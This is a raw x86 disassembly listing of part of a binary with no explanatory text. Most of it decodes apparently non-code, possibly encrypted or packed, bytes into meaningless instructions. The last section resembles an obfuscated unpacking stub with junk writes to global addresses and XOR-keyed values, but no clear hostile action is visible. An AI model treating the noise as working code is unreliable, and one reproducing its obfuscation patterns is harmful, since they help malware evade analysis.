  403155:	fdiv   DWORD PTR es:[ebp+ebx*1+0x1bc1542e]
  40315d:	cmp    eax,0x5720537d
  403162:	leave  
  403163:	dec    ebx
  403164:	fild   QWORD PTR [edi+0x76162918]
  40316a:	test   DWORD PTR [ebx],eax
  40316c:	call   0x10a07d63
  403171:	cdq    
  403172:	adc    BYTE PTR [edx-0x668ce720],bl
  403178:	retf   0xf249
  40317b:	add    al,0xaf
  40317d:	or     BYTE PTR [ebx-0x5e4b3b4e],dh
  403183:	jp     0x40310e
  403185:	jb     0x403192
  403187:	jg     0x4031dd
  403189:	retf   0x7f30
  40318c:	dec    ebp
  40318d:	rol    ah,0x70
  403190:	pop    esi
  403191:	or     ebp,esi
  403193:	pop    DWORD PTR [ebx]
  403195:	jmp    0x2623:0xa7f30763
  40319c:	mov    BYTE PTR [ebp+ebp*1-0x78],bh
  4031a0:	popa   
  4031a1:	repnz push eax
  4031a3:	imul   esi,ebx,0xffffffa7
  4031a6:	xchg   cl,ah
  4031a8:	repz shl DWORD PTR ds:0x71e024ab,cl
  4031af:	mov    cl,0xbe
  4031b1:	cmp    eax,0xfae2abc9
  4031b6:	adc    ebp,0xaad1f3b7
  4031bc:	inc    eax
  4031bd:	(bad)  
  4031be:	mov    ebp,0x47a880a3
  4031c3:	mov    edx,DWORD PTR [ebx]
  4031c5:	xchg   esi,eax
  4031c6:	push   esi
  4031c7:	ins    BYTE PTR es:[edi],dx
  4031c8:	outs   dx,DWORD PTR ds:[esi]
  4031c9:	cli    
  4031ca:	pop    eax
  4031cb:	sbb    eax,0xe3482880
  4031d0:	cs pop eax
  4031d2:	pop    edx
  4031d3:	mov    bh,0x14
  4031d5:	or     DWORD PTR ds:0x140c58ab,eax
  4031db:	cld    
  4031dc:	mov    edi,0x1051c78b
  4031e1:	cmc    
  4031e2:	test   al,0x46
  4031e4:	pop    eax
  4031e5:	cmp    eax,0x4e5e9ec0
  4031ea:	test   eax,0x5d6cd15f
  4031ef:	test   ebp,0xe0abc053
  4031f5:	aad    0xaa
  4031f7:	mov    ecx,0xb9e2eb2e
  4031fc:	cdq    
  4031fd:	or     edi,ecx
  4031ff:	xor    DWORD PTR ds:0x60941577,ebp
  403205:	lods   eax,DWORD PTR ds:[esi]
  403206:	mov    eax,DWORD PTR [ecx]
  403208:	out    0x60,al
  40320a:	ds sbb bl,bl
  40320d:	mov    al,ds:0x1230a832
  403212:	leave  
  403213:	push   ecx
  403214:	test   BYTE PTR [ebx+0x39],ah
  403217:	dec    esi
  403218:	lahf   
  403219:	sbb    al,0x16
  40321b:	sub    esp,DWORD PTR [ecx]
  40321d:	enter  0x5e7,0xc3
  403221:	pusha  
  403222:	int    0xd4
  403224:	jne    0x403202
  403226:	push   edx
  403227:	cwde   
  403228:	lds    eax,FWORD PTR [esi]
  40322a:	jb     0x403258
  40322c:	sahf   
  40322d:	(bad)  
  40322e:	cmp    DWORD PTR [ecx],ebp
  403230:	or     al,0x90
  403232:	jne    0x4031be
  403234:	jge    0x403235
  403236:	and    ch,bh
  403238:	loopne 0x4031ec
  40323a:	and    al,0x21
  40323c:	mov    ecx,0xf141b8da
  403241:	jmp    0xa771:0xe3a6e6c0
  403248:	sub    ebx,ebx
  40324a:	push   ecx
  40324b:	mov    ah,0xb6
  40324d:	out    0x2c,al
  40324f:	in     al,0x6d
  403251:	xor    ah,BYTE PTR [eax-0x2c]
  403254:	in     al,dx
  403255:	in     al,dx
  403256:	fldcw  WORD PTR [edi]
  403258:	ret    
  403259:	ins    DWORD PTR es:[edi],dx
  40325a:	out    0xa6,eax
  40325c:	enter  0x1419,0xaf
  403260:	loopne 0x4032de
  403262:	mov    esi,0x1272d89e
  403267:	hlt    
  403268:	fimul  DWORD PTR [eax+0xb]
  40326b:	jmp    0x4032a5
  40326d:	test   DWORD PTR [eax-0x5c49167f],edi
  403273:	dec    eax
  403274:	or     dl,BYTE PTR [ebx+0x73]
  403277:	pop    edi
  403278:	nop
  403279:	pop    edi
  40327a:	outs   dx,DWORD PTR ds:[esi]
  40327b:	pop    ecx
  40327c:	mov    ah,0xc7
  40327e:	pop    es
  40327f:	xor    eax,0x4ba8f819
  403284:	ja     0x40327d
  403286:	out    0xc9,eax
  403288:	sbb    al,0xcb
  40328a:	repz lea ebx,[ebx]
  40328d:	int    0xd4
  40328f:	in     al,0xd8
  403291:	loope  0x403222
  403293:	jg     0x403255
  403295:	(bad)  
  403296:	ins    DWORD PTR es:[edi],dx
  403297:	add    DWORD PTR [edx-0x4],0xffffff8a
  40329b:	push   ecx
  40329c:	pop    ebp
  40329d:	pop    ebx
  40329e:	push   ss
  40329f:	mov    ebp,esi
  4032a1:	mov    bl,0x92
  4032a3:	dec    edi
  4032a4:	in     al,dx
  4032a5:	mov    DWORD PTR [ebx+0x70f85773],edx
  4032ab:	jbe    0x403248
  4032ad:	push   edi
  4032ae:	add    DWORD PTR [ebp+0x208ffbb7],esp
  4032b4:	mov    ah,0x69
  4032b6:	or     eax,0x8d2d9d8
  4032bb:	dec    edi
  4032bc:	test   al,0xca
  4032be:	not    WORD PTR [ebp-0x83c70cc]
  4032c5:	fbld   TBYTE PTR [edi]
  4032c7:	cmp    eax,0xd6f2105a
  4032cc:	xor    ch,bl
  4032ce:	adc    DWORD PTR [edx+0x7d],0xb085b33d
  4032d5:	leave  
  4032d6:	lods   al,BYTE PTR ds:[esi]
  4032d7:	popf   
  4032d8:	mov    dl,0x85
  4032da:	mov    dh,0xaa
  4032dc:	push   ss
  4032dd:	xchg   BYTE PTR [edx],dh
  4032df:	pop    esi
  4032e0:	cwde   
  4032e1:	js     0x403307
  4032e3:	nop
  4032e4:	jno    0x40333b
  4032e6:	cwde   
  4032e7:	push   esp
  4032e8:	xchg   ecx,eax
  4032e9:	push   es
  4032ea:	xor    al,0xac
  4032ec:	inc    ecx
  4032ed:	out    0x8f,al
  4032ef:	sbb    BYTE PTR [edx-0xf34c46d],bh
  4032f5:	jle    0x4032a2
  4032f7:	pusha  
  4032f8:	retf   0xeb2f
  4032fb:	loopne 0x4032fe
  4032fd:	out    dx,eax
  4032fe:	or     al,0x33
  403300:	lock or BYTE PTR [ebx],dh
  403303:	inc    esp
  403304:	scas   al,BYTE PTR es:[edi]
  403305:	retf   
  403306:	mov    edi,0xbcff9a42
  40330b:	mov    dl,0xb2
  40330d:	push   ss
  40330e:	adc    al,BYTE PTR [eax-0x3a68baea]
  403314:	push   ebp
  403315:	sti    
  403316:	lahf   
  403317:	xchg   esi,eax
  403318:	jne    0x40334a
  40331a:	push   ebp
  40331b:	jg     0x40330c
  40331d:	out    dx,al
  40331e:	cli    
  40331f:	sbb    BYTE PTR [eax+0x587b161f],ah
  403325:	rol    ah,cl
  403327:	int3   
  403328:	popa   
  403329:	xchg   esi,eax
  40332a:	stos   DWORD PTR es:[edi],eax
  40332b:	pop    ss
  40332c:	adc    al,0x37
  40332e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40332f:	pop    DWORD PTR [esi+0x560ec883]
  403335:	inc    esi
  403336:	mov    DWORD PTR [edx],ebp
  403338:	xchg   ecx,eax
  403339:	in     eax,dx
  40333a:	(bad)  
  40333b:	cmp    ebx,eax
  40333d:	repnz mov esp,0xc3078165
  403343:	fstp   st(1)
  403345:	sub    ebx,esp
  403347:	lods   al,BYTE PTR ds:[esi]
  403348:	cmp    edx,ebp
  40334a:	jnp    0x40334c
  40334c:	aad    0xcf
  40334e:	add    esi,ebp
  403350:	arpl   cx,bx
  403352:	jl     0x4032d8
  403354:	sub    DWORD PTR [edi+0x4c],edx
  403357:	neg    DWORD PTR ds:0x2866aeda
  40335d:	sbb    DWORD PTR [edx+0x1b9cf6d0],edx
  403363:	dec    ecx
  403364:	lock and al,0xdd
  403367:	cmp    BYTE PTR [ebp-0x76cc293d],0x91
  40336e:	mov    dh,0xa
  403370:	xchg   edi,eax
  403371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403372:	je     0x4033b8
  403374:	cmp    eax,0xd28d6f55
  403379:	or     BYTE PTR [edi+edx*1+0x10],bh
  40337d:	cmp    ebx,DWORD PTR [ebp+0x6e9faee9]
  403383:	push   0xee61181b
  403388:	fwait
  403389:	push   ebx
  40338a:	mov    al,dl
  40338c:	adc    eax,0x1a288d9e
  403391:	(bad)  
  403392:	frndint 
  403394:	sbb    eax,0x396c8a7f
  403399:	add    al,0x74
  40339b:	pop    ds
  40339c:	test   al,0xbd
  40339e:	jp     0x4033a6
  4033a0:	inc    edx
  4033a1:	iret   
  4033a2:	stos   BYTE PTR es:[edi],al
  4033a3:	fnstsw WORD PTR [ebx]
  4033a5:	in     eax,0x8e
  4033a7:	mov    WORD PTR [edx+edx*2],fs
  4033aa:	scas   al,BYTE PTR es:[edi]
  4033ab:	sti    
  4033ac:	imul   ebx,DWORD PTR [ecx],0x54356c0c
  4033b2:	add    al,0x9
  4033b4:	sub    DWORD PTR [eax],ecx
  4033b6:	xchg   ebx,eax
  4033b7:	inc    esi
  4033b8:	scas   eax,DWORD PTR es:[edi]
  4033b9:	dec    ecx
  4033ba:	aad    0xf2
  4033bc:	and    bl,al
  4033be:	sbb    eax,0x7c9d697f
  4033c3:	ins    DWORD PTR es:[edi],dx
  4033c4:	aad    0x2a
  4033c6:	dec    esi
  4033c7:	jmp    0x1a7e:0xa15f6d2b
  4033ce:	ds cmp eax,0x629eaf6e
  4033d4:	jae    0x4033b0
  4033d6:	stc    
  4033d7:	mov    cl,0x66
  4033d9:	enter  0x337c,0x21
  4033dd:	bound  ebx,QWORD PTR [edx-0x19]
  4033e0:	adc    eax,0x7d0470e3
  4033e5:	addr16 inc esp
  4033e7:	(bad)  
  4033e8:	adc    eax,0x2e125fda
  4033ed:	add    DWORD PTR [edx+eiz*4+0x64],esp
  4033f1:	je     0x403453
  4033f3:	push   ebp
  4033f4:	dec    eax
  4033f5:	out    0x96,eax
  4033f7:	cmp    DWORD PTR [eax-0x671b78ab],eax
  4033fd:	je     0x40344d
  4033ff:	mov    dl,0x89
  403401:	cmp    ebx,edx
  403403:	shl    DWORD PTR [eax-0x73],1
  403406:	mul    bh
  403408:	gs icebp 
  40340a:	or     eax,0xd5b02a20
  40340f:	mov    al,ds:0x3661c2d4
  403414:	cmp    bh,ch
  403416:	iret   
  403417:	repz push esi
  403419:	mov    edx,0x7d6d09e
  40341e:	fcom   DWORD PTR [ebx-0x3424190d]
  403424:	xchg   esp,eax
  403425:	xor    BYTE PTR [edi+0x3],dl
  403428:	aad    0xf3
  40342a:	fsubr  st,st(2)
  40342c:	mov    bh,0x3c
  40342e:	popw   ds
  403430:	jmp    0x403450
  403432:	xor    dl,BYTE PTR [esi+ecx*4-0x5b]
  403436:	adc    al,0xaf
  403438:	aaa    
  403439:	dec    ebp
  40343a:	aam    0x63
  40343c:	cwde   
  40343d:	add    ch,dh
  40343f:	adc    eax,0x71ae6533
  403444:	mov    ah,0xec
  403446:	adc    BYTE PTR [edi+0x2a],ch
  403449:	and    BYTE PTR [ebx-0x5b],al
  40344c:	(bad)  
  40344d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40344e:	ds add edi,edi
  403451:	(bad)  
  403452:	lods   al,BYTE PTR ds:[esi]
  403453:	push   0xbf29370e
  403458:	xor    esi,ebx
  40345a:	stos   BYTE PTR es:[edi],al
  40345b:	xor    DWORD PTR [eax-0x18df00ad],ecx
  403461:	hlt    
  403462:	sbb    cl,BYTE PTR [ecx]
  403464:	xlat   BYTE PTR ds:[ebx]
  403465:	sti    
  403466:	inc    edi
  403467:	div    DWORD PTR [ebx-0x34]
  40346a:	xor    eax,0x9758040c
  40346f:	outs   dx,BYTE PTR ds:[esi]
  403470:	add    eax,0xb6f6a66a
  403475:	test   DWORD PTR ds:0xc4114641,ecx
  40347b:	and    DWORD PTR [ebx+edi*2-0x11aee8e9],0xad204fcf
  403486:	xchg   esi,eax
  403487:	xchg   esp,eax
  403488:	pop    esp
  403489:	fsub   QWORD PTR [ecx]
  40348b:	scas   al,BYTE PTR es:[edi]
  40348c:	push   ds
  40348d:	and    ah,ah
  40348f:	retf   0x8ff2
  403492:	leave  
  403493:	test   dh,dl
  403495:	es scas al,BYTE PTR es:[edi]
  403497:	call   0x1721c5bf
  40349c:	mov    edi,0x89c34352
  4034a1:	xchg   edi,eax
  4034a2:	je     0x4034de
  4034a4:	std    
  4034a5:	retf   0xfd55
  4034a8:	jne    0x403460
  4034aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034ab:	aaa    
  4034ac:	(bad)  [esi+0x53]
  4034af:	sub    BYTE PTR ds:0x63d7e190,dl
  4034b5:	imul   esp,DWORD PTR [ebp-0x54],0xffffff8d
  4034b9:	(bad)  
  4034ba:	scas   al,BYTE PTR es:[edi]
  4034bb:	mov    ecx,0xa3ea81a6
  4034c0:	push   0xffffffdc
  4034c2:	cmc    
  4034c3:	pop    ebx
  4034c4:	cmc    
  4034c5:	and    bl,BYTE PTR [ebx]
  4034c7:	inc    ecx
  4034c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034c9:	pop    ds
  4034ca:	inc    eax
  4034cb:	jecxz  0x403511
  4034cd:	xchg   edi,eax
  4034ce:	dec    edx
  4034cf:	retf   
  4034d0:	mov    ds:0x94764bd7,eax
  4034d5:	out    0x51,al
  4034d7:	(bad)
  4034da:	adc    bh,BYTE PTR [eax+0x43]
  4034dd:	and    BYTE PTR [edi],bl
  4034df:	in     eax,dx
  4034e0:	aam    0xff
  4034e2:	cwde   
  4034e3:	mov    eax,0xf286816e
  4034e8:	hlt    
  4034e9:	repnz mov edi,0xc0f6c2ce
  4034ef:	adc    eax,0x13871a2c
  4034f4:	cld    
  4034f5:	scas   al,BYTE PTR es:[edi]
  4034f6:	(bad)  [eax]
  4034f8:	xor    al,0x74
  4034fa:	xchg   esp,ecx
  4034fc:	aaa    
  4034fd:	sahf   
  4034fe:	(bad)  
  4034ff:	cmp    DWORD PTR [ecx-0x3ba5d92e],eax
  403505:	jmp    0x4034c9
  403507:	aas    
  403508:	sub    al,BYTE PTR [ecx]
  40350a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40350b:	mov    al,0x95
  40350d:	outs   dx,DWORD PTR ds:[esi]
  40350e:	sub    bl,BYTE PTR [ebx-0x45]
  403511:	mov    ah,0xa7
  403513:	xor    DWORD PTR [eax+0x11085143],esi
  403519:	jae    0x4034c6
  40351b:	bswap  eax
  40351d:	mov    bl,0xe4
  40351f:	xor    ebp,DWORD PTR [ebp+0x6a]
  403522:	adc    ebp,ebp
  403524:	leave  
  403525:	pop    eax
  403526:	jb     0x403507
  403528:	lds    edi,FWORD PTR [ecx]
  40352a:	jbe    0x403518
  40352c:	hlt    
  40352d:	rcl    ebp,cl
  40352f:	push   esi
  403530:	add    al,0xf
  403532:	jo     0x403592
  403534:	pop    ss
  403535:	cld    
  403536:	mov    eax,0xbbe91568
  40353b:	jo     0x4034e9
  40353d:	xor    BYTE PTR [edi+0x523d40fe],0x60
  403544:	jbe    0x403546
  403546:	scas   eax,DWORD PTR es:[edi]
  403547:	ret    0x797d
  40354a:	data16 jg 0x4034db
  40354d:	fistp  DWORD PTR [esi]
  40354f:	outs   dx,DWORD PTR ds:[esi]
  403550:	jmp    0xf1245a01
  403555:	loope  0x4034e7
  403557:	jmp    0x403526
  403559:	jmp    0x40357e
  40355b:	popf   
  40355c:	mov    ah,0xaa
  40355e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40355f:	call   0xa247:0xfddde1aa
  403566:	mov    al,ds:0x291a0ca5
  40356b:	lods   al,BYTE PTR ds:[esi]
  40356c:	scas   eax,DWORD PTR es:[edi]
  40356d:	fidiv  DWORD PTR [ebp+ebp*2-0x74]
  403571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403572:	test   eax,0x773a6b49
  403577:	xchg   ecx,eax
  403578:	xor    bh,ah
  40357a:	xrelease mov BYTE PTR [ebp+esi*2+0x4a],dl
  40357f:	rcr    BYTE PTR [ecx],1
  403581:	mov    al,ds:0x869a81f3
  403586:	std    
  403587:	pop    esi
  403588:	stos   DWORD PTR es:[edi],eax
  403589:	sbb    BYTE PTR [ecx],ch
  40358b:	push   ds
  40358c:	xchg   esi,eax
  40358d:	dec    ecx
  40358e:	(bad)  
  40358f:	mov    al,ds:0x7d2708e7
  403594:	ja     0x403592
  403596:	jno    0x403593
  403598:	bound  edx,QWORD PTR ds:0xc6fe9ad5
  40359e:	div    ecx
  4035a0:	jb     0x4035b9
  4035a2:	mov    BYTE PTR [ecx-0x58f0e587],0x29
  4035a9:	scas   eax,DWORD PTR es:[edi]
  4035aa:	sub    BYTE PTR [ebp-0x2e96cdc],ch
  4035b0:	dec    esp
  4035b1:	and    cl,ch
  4035b3:	std    
  4035b4:	sbb    al,0x51
  4035b6:	ja     0x4035de
  4035b8:	sbb    al,0xa7
  4035ba:	ins    DWORD PTR es:[edi],dx
  4035bb:	outs   dx,DWORD PTR ds:[esi]
  4035bc:	loop   0x40355c
  4035be:	(bad)  
  4035bf:	call   0xe27b7552
  4035c4:	lods   eax,DWORD PTR ds:[esi]
  4035c5:	mov    BYTE PTR [ebx-0x5f],0x1a
  4035c9:	ds ins DWORD PTR es:[edi],dx
  4035cb:	sbb    al,0x9a
  4035cd:	pop    ecx
  4035ce:	pop    esi
  4035cf:	sbb    BYTE PTR [eax+eiz*8-0x5c0d7aac],dl
  4035d6:	addr16 mov dl,0x5e
  4035d9:	sub    BYTE PTR [esi+0x23],dh
  4035dc:	fmul   DWORD PTR [ebp+0x2b62bf89]
  4035e2:	mov    esp,0x2202c073
  4035e7:	add    eax,DWORD PTR [ebp+0x43]
  4035ea:	fwait
  4035eb:	inc    esp
  4035ec:	out    0x53,eax
  4035ee:	xor    ebp,ebp
  4035f0:	cmp    eax,0xdd977727
  4035f5:	cmp    BYTE PTR ds:0x8ecd0dd1,ch
  4035fb:	(bad)  
  4035fc:	loope  0x403678
  4035fe:	mov    DWORD PTR [eax+0x3b],0x80b96df3
  403605:	add    al,0xa1
  403607:	jmp    0x4035d7
  403609:	or     al,0xa4
  40360b:	mov    ah,0x40
  40360d:	addr16 shl ebx,0xf2
  403611:	ror    DWORD PTR [eax-0x47],cl
  403614:	dec    edi
  403615:	(bad)  
  403616:	cld    
  403617:	fisttp DWORD PTR [edi+0xf]
  40361a:	pop    ds
  40361b:	int3   
  40361c:	fistp  WORD PTR [edx]
  40361e:	out    dx,al
  40361f:	out    0xf0,al
  403621:	sub    bh,0xc3
  403624:	xchg   edi,eax
  403625:	mov    ds:0x154b0254,al
  40362a:	not    BYTE PTR [ebp-0x38003411]
  403630:	outs   dx,DWORD PTR ds:[esi]
  403631:	test   DWORD PTR [eax-0x5d],0x27bd54c7
  403638:	(bad)  
  40363a:	jmp    0xce3d:0xafa55ff0
  403641:	add    al,0x99
  403643:	cmp    al,0x76
  403645:	adc    DWORD PTR [ebx],edx
  403647:	mov    eax,ds:0xa5c20944
  40364c:	out    dx,eax
  40364d:	data16 adc cl,al
  403650:	(bad)  
  403651:	jns    0x403686
  403653:	or     cl,0x94
  403656:	test   eax,0xda797dff
  40365b:	adc    al,0xb6
  40365d:	sbb    bl,BYTE PTR [ebx-0x4]
  403660:	cwde   
  403661:	cdq    
  403662:	pop    ds
  403663:	daa    
  403664:	gs push ss
  403666:	dec    DWORD PTR [eax]
  403668:	mov    ecx,0xbadf3e5b
  40366d:	es cdq 
  40366f:	add    DWORD PTR [ebp+0x5e51b0cd],edx
  403675:	jge    0x4036bb
  403677:	dec    ebp
  403678:	mov    ebx,0xe06ebf57
  40367d:	les    ecx,FWORD PTR [edx]
  40367f:	or     BYTE PTR [esi-0x2f],dl
  403682:	or     esp,edx
  403684:	mov    ebx,0x9f963ffd
  403689:	mov    bh,0x61
  40368b:	mov    ds:0xc67e1cd9,al
  403690:	pop    DWORD PTR [esi]
  403692:	lods   eax,DWORD PTR ds:[esi]
  403693:	les    edx,FWORD PTR [esp+eiz*8-0x69c103ff]
  40369a:	push   0x6e
  40369c:	jae    0x403717
  40369e:	fcmovne st,st(7)
  4036a0:	call   0x4153:0xb70d5786
  4036a7:	scas   al,BYTE PTR es:[edi]
  4036a8:	xor    esp,edi
  4036aa:	popa   
  4036ab:	in     al,0x2b
  4036ad:	push   edi
  4036ae:	sbb    ebp,ebp
  4036b0:	ss int 0x3e
  4036b3:	sub    al,0x2d
  4036b5:	pop    eax
  4036b6:	inc    ebp
  4036b7:	outs   dx,BYTE PTR ds:[esi]
  4036b8:	dec    esp
  4036b9:	sbb    ebx,edi
  4036bb:	adc    BYTE PTR [ebx-0x5a6d3aea],cl
  4036c1:	addr16 dec esi
  4036c3:	mov    ah,0xb3
  4036c5:	lods   eax,DWORD PTR ds:[esi]
  4036c6:	and    ah,dl
  4036c8:	inc    edi
  4036c9:	ret    
  4036ca:	scas   eax,DWORD PTR es:[edi]
  4036cb:	fs mov dh,0xda
  4036ce:	pop    edi
  4036cf:	in     al,0xda
  4036d1:	ret    0x57f3
  4036d4:	ins    DWORD PTR es:[edi],dx
  4036d5:	push   ss
  4036d6:	dec    eax
  4036d7:	push   edx
  4036d8:	(bad)  
  4036d9:	jge    0x403691
  4036db:	add    edi,ebp
  4036dd:	mov    ah,0xe1
  4036df:	sbb    DWORD PTR [ecx],esi
  4036e1:	mov    dl,0x5d
  4036e3:	and    esi,ebx
  4036e5:	jbe    0x403699
  4036e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036e8:	imul   ebp,DWORD PTR [ebx-0x78],0xffffff91
  4036ec:	stos   BYTE PTR es:[edi],al
  4036ed:	dec    eax
  4036ee:	add    DWORD PTR [edx+esi*2-0x77703dc9],ebp
  4036f5:	aam    0xc1
  4036f7:	fnstcw WORD PTR [edx]
  4036f9:	imul   ebx,DWORD PTR [edi+0x11],0xd47e6c42
  403700:	cli    
  403701:	sub    al,0xfa
  403703:	mov    dh,0xdb
  403705:	sbb    DWORD PTR [ebx-0x41f83339],ecx
  40370b:	jge    0x40378b
  40370d:	inc    ecx
  40370e:	ret    
  40370f:	or     eax,0x8b428ede
  403714:	sbb    eax,0x929c47db
  403719:	xchg   al,bl
  40371b:	aam    0x28
  40371d:	aaa    
  40371e:	enter  0x83b7,0xd7
  403722:	fsubr  DWORD PTR [ebx+0x280df0ea]
  403728:	js     0x403778
  40372a:	loope  0x403726
  40372c:	arpl   WORD PTR [ecx],di
  40372e:	int    0xc7
  403730:	inc    ecx
  403731:	shl    DWORD PTR [edx-0x27],0xce
  403735:	xchg   DWORD PTR ds:0x4ffd0437,ecx
  40373b:	dec    ecx
  40373c:	xor    dl,BYTE PTR [ebx+0x45]
  40373f:	call   0x29c1:0x907f2ca0
  403746:	xchg   DWORD PTR [ecx+0x1ebcb94f],esp
  40374c:	jecxz  0x40376e
  40374e:	xlat   BYTE PTR ds:[ebx]
  40374f:	xchg   ebp,eax
  403750:	(bad)  
  403751:	call   0xc18ac1b1
  403756:	inc    ecx
  403757:	xchg   DWORD PTR [ebx+0x40ddf17c],ebx
  40375d:	push   esp
  40375e:	fmul   DWORD PTR [ebp+eax*8+0x79]
  403762:	adc    cl,0xf7
  403765:	adc    eax,0xe6f6c4d0
  40376a:	or     al,0xdb
  40376c:	mov    ebp,0xb155049
  403771:	adc    eax,0xfa4f734a
  403776:	mov    cl,0xcb
  403778:	dec    eax
  403779:	dec    edi
  40377a:	sbb    dl,BYTE PTR [esi-0x4d]
  40377d:	ficomp DWORD PTR [ecx]
  40377f:	sbb    edx,DWORD PTR [ecx]
  403781:	cli    
  403782:	or     eax,edx
  403784:	shl    esp,1
  403786:	sub    BYTE PTR [ebx],0xa7
  403789:	push   esi
  40378a:	les    eax,FWORD PTR [ebx]
  40378c:	sub    dl,bl
  40378e:	jp     0x40375c
  403790:	push   eax
  403791:	add    BYTE PTR [edi],dh
  403793:	xchg   ebx,eax
  403794:	or     dh,BYTE PTR [esi+ebp*4-0x57]
  403798:	xor    al,0x86
  40379a:	or     BYTE PTR [ecx],dh
  40379c:	inc    esp
  40379d:	jbe    0x40375a
  40379f:	popa   
  4037a0:	mov    ah,0xab
  4037a2:	imul   al
  4037a4:	lods   eax,DWORD PTR ds:[esi]
  4037a5:	hlt    
  4037a6:	push   DWORD PTR [eax+0x66]
  4037a9:	jno    0x403769
  4037ab:	pusha  
  4037ac:	lods   eax,DWORD PTR gs:[si]
  4037af:	add    dh,BYTE PTR [ebp+esi*2+0x8]
  4037b3:	cmp    BYTE PTR [eax-0x66],ch
  4037b6:	arpl   WORD PTR [ecx-0x2a227795],si
  4037bc:	jbe    0x403794
  4037be:	inc    esi
  4037bf:	mov    bl,0x44
  4037c1:	mov    ebp,0xa7e2aa6d
  4037c6:	loopne 0x40374c
  4037c8:	lods   eax,DWORD PTR ds:[esi]
  4037c9:	pop    ss
  4037ca:	jno    0x40378d
  4037cc:	xchg   esi,eax
  4037cd:	ja     0x4037ed
  4037cf:	cmp    ch,BYTE PTR [edx+0x28e6d8ec]
  4037d5:	mov    DWORD PTR [ebp-0x53],0x730c3d07
  4037dc:	sub    eax,0xbcdae492
  4037e1:	pop    ds
  4037e2:	sbb    DWORD PTR [ebx],esp
  4037e4:	cmp    eax,0x55614283
  4037e9:	std    
  4037ea:	and    eax,0xcda3b959
  4037ef:	jmp    0xa49f:0x1bed0320
  4037f6:	xor    BYTE PTR [eax+0x7e8c1fab],0x34
  4037fd:	scas   eax,DWORD PTR es:[edi]
  4037fe:	sub    bh,BYTE PTR [ebx]
  403800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403801:	push   ecx
  403802:	imul   edx,DWORD PTR [ebx-0x1],0x3dfb046b
  403809:	fwait
  40380a:	rol    DWORD PTR [eax],cl
  40380c:	lea    edx,[edx-0x399d32c3]
  403812:	xor    ebx,DWORD PTR [eax-0xfba74c2]
  403818:	mov    ecx,DWORD PTR [ebp-0x10]
  40381b:	xor    eax,esi
  40381d:	xor    ecx,esi
  40381f:	sub    DWORD PTR ds:0x428eb3,0x5e8a
  403829:	lea    ecx,[eax+ecx*1+0x64e5ec]
  403830:	mov    eax,DWORD PTR [ebp-0xc]
  403833:	sbb    DWORD PTR ds:0x428e97,0x428e5b
  40383d:	xor    edx,edx
  40383f:	adc    DWORD PTR ds:0x428e4b,0x428eab
  403849:	div    ecx
  40384b:	movzx  eax,WORD PTR ds:0x428e2b
  403852:	add    DWORD PTR ds:0x428eb3,eax
  403858:	mov    eax,DWORD PTR [ebp-0x8]
  40385b:	mov    DWORD PTR ds:0x428e57,0x1e
  403865:	cmp    DWORD PTR ds:0x428e57,0x0
  40386c:	je     0x4038bb
  403872:	cmp    DWORD PTR ds:0x428e57,0x9
  403879:	jb     0x4038bb
  40387f:	jmp    0x40388d
  403884:	push   DWORD PTR [ebp-0x10]
  403887:	call   DWORD PTR ds:0x42a9db
  40388d:	cmp    DWORD PTR ds:0x428e57,0xa
  403894:	jne    0x4038a7
  40389a:	mov    ecx,DWORD PTR ds:0x428e57
  4038a0:	dec    ecx
  4038a1:	mov    DWORD PTR ds:0x428e57,ecx
  4038a7:	xor    ecx,ecx
  4038a9:	add    ecx,DWORD PTR ds:0x428e57
  4038af:	dec    ecx
  4038b0:	mov    DWORD PTR ds:0x428e57,ecx
  4038b6:	jmp    0x403865
  4038bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4038be:	xor    eax,esi
  4038c0:	xor    ecx,esi
  4038c2:	sub    eax,ecx
  4038c4:	mov    DWORD PTR ds:0x428e43,0x1a6e
  4038ce:	cmp    edx,eax
  4038d0:	mov    DWORD PTR ds:0x428e43,0x4c12
  4038da:	jne    0x403ae6
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4038ea:	sbb    eax,DWORD PTR ds:0x428ec3
  4038f0:	mov    eax,DWORD PTR [ebp-0x28]
  4038f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4038f6:	or     DWORD PTR ds:0x428ec3,0x7d0f
  403900:	xor    eax,esi
  403902:	xor    ecx,esi
  403904:	add    eax,edi
  403906:	add    ecx,edi
  403908:	mov    BYTE PTR [ebp-0x21],dl
  40390b:	mov    DWORD PTR ds:0x428e57,0x12ce
  403915:	cmp    eax,ecx
  403917:	mov    DWORD PTR ds:0x428eab,0x3e33
  403921:	jae    0x403a8f
  403927:	mov    edx,DWORD PTR ds:0x428e57
  40392d:	xor    DWORD PTR ds:0x428e87,edx
  403933:	lea    ecx,[eax-0x3272f6]
  403939:	mov    DWORD PTR [ebp-0x14],ecx
  40393c:	and    DWORD PTR ds:0x428e73,0x0
  403946:	mov    edx,DWORD PTR ds:0x428e73
  40394c:	inc    edx
  40394d:	mov    DWORD PTR ds:0x428e73,edx
  403953:	cmp    DWORD PTR ds:0x428e73,0x20
  40395a:	ja     0x403980
  403960:	jmp    0x403973
  403965:	push   0x428e8b
  40396a:	push   DWORD PTR [ebp-0xc]
  40396d:	call   DWORD PTR ds:0x42a9df
  403973:	cmp    DWORD PTR ds:0x428e73,0x11
  40397a:	jb     0x403946
  403980:	mov    edx,DWORD PTR [ebp-0x14]
  403983:	or     DWORD PTR ds:0x428e6b,0xd5d
  40398d:	xor    edx,esi
  40398f:	xor    DWORD PTR ds:0x428e83,0x428e5f
  403999:	add    edx,0x7f55d8e3
  40399f:	lea    ecx,[ebp+eax*4-0xb4]
  4039a6:	mov    DWORD PTR [ecx],edx
  4039a8:	mov    DWORD PTR ds:0x428e47,0xcba
  4039b2:	mov    edx,DWORD PTR [ecx]
  4039b4:	mov    DWORD PTR ds:0x428e2b,0xfd2
